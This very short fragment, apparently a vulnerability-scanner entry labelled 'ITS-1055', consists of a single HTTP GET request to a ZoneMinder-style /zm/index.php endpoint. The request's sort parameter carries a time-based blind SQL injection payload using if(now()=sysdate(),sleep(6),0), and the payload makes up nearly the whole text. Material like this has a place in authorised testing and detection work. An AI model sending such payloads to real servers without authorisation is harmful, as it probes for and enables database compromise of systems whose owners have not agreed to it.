# Vulnerable: ITS-1055
GET /zm/index.php?sort=if(now()=sysdate()%2Csleep(6)%2C0)&order=desc&limit=20&view=request&request=watch&mid=1
